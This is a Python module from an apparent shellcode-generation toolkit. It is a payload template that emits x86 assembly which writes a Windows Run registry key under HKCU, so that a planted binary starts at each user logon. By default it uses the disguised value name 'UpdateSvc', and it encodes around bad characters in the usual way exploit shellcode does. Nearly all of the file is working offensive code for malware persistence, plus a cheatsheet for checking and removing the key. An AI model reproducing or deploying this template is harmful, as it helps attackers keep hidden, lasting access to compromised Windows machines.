"""Registry Run-key persistence payload template.

Writes a Run value under HKCU or HKLM so the binary auto-starts on
user logon.

Template sequence:
  RegOpenKeyExA(HKEY, Run subkey, KEY_SET_VALUE) ->
  RegSetValueExA(hKey, value_name, REG_SZ, dst_path) ->
  RegCloseKey

Required functions: RegOpenKeyExA, RegSetValueExA, RegCloseKey
Required variables: reg_handle
Required strings:   advapi32_dll, reg_subkey, reg_value_name, dst_path
"""
from __future__ import annotations

from ..encode import (
    safe_call_mem,
    safe_lea,
    safe_push_dword,
    safe_push_imm,
    safe_push_mem,
)
from .base import PayloadTemplate, TemplateConfig


class RegistryPersistTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars

        regopen_off   = -layout.slot("RegOpenKeyExA").offset
        regset_off    = -layout.slot("RegSetValueExA").offset
        regclose_off  = -layout.slot("RegCloseKey").offset

        reg_h_off     = -layout.slot("reg_handle").offset

        subkey_off    = -layout.slot("reg_subkey").offset
        valname_off   = -layout.slot("reg_value_name").offset
        binpath_slot  = layout.slot("dst_path")
        binpath_off   = -binpath_slot.offset

        # cbData must not exceed the stack slot allocation.  The slot
        # size is ceil4(len + 1), which is always >= the null-terminated
        # string length and never reads past the slot boundary.
        data_size = binpath_slot.size

        return "\n".join([
            "; -- Registry Run-Key Persistence --",
            f"; Value: {config.service_name or 'UpdateSvc'}",
            f"; Binary: (from manifest dst_path string slot, {data_size} bytes)",
            "",

            "    ; RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey)",
            *safe_lea("eax", "ebp", reg_h_off, bc),
            "    push eax                    ; phkResult = &reg_handle",
            *safe_push_imm(2, bc),
            "    ; samDesired = KEY_SET_VALUE (0x0002)",
            "    xor  eax, eax",
            "    push eax                    ; ulOptions = 0",
            *safe_lea("eax", "ebp", subkey_off, bc),
            "    push eax                    ; lpSubKey",
            *safe_push_dword(0x80000001, bc),
            "    ; hKey = HKEY_CURRENT_USER",
            *safe_call_mem("ebp", regopen_off, bc),
            "    test eax, eax",
            "    jnz  rp_done                 ; RegOpenKeyExA failed (non-zero = error)",
            "",

            "    ; RegSetValueExA(hKey, valueName, 0, REG_SZ, dst_path, cbData)",
            *safe_push_imm(data_size, bc),
            f"    ; cbData = {data_size} (slot size)",
            *safe_lea("eax", "ebp", binpath_off, bc),
            "    push eax                    ; lpData = &dst_path",
            *safe_push_imm(1, bc),
            "    ; dwType = REG_SZ",
            "    xor  eax, eax",
            "    push eax                    ; Reserved = 0",
            *safe_lea("eax", "ebp", valname_off, bc),
            "    push eax                    ; lpValueName",
            *safe_push_mem("ebp", reg_h_off, bc),
            *safe_call_mem("ebp", regset_off, bc),
            "",

            "    ; RegCloseKey(hKey)",
            *safe_push_mem("ebp", reg_h_off, bc),
            *safe_call_mem("ebp", regclose_off, bc),
            "",

            "rp_done:",
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        val = config.service_name or "UpdateSvc"
        return [
            ("Registry hive", "HKEY_CURRENT_USER"),
            ("Run key", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
            ("Value name", val),
            ("Binary path on target", config.dst_path or ""),
            ("Check value", f'reg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v {val}'),
            ("Remove value", f'reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v {val} /f'),
        ]
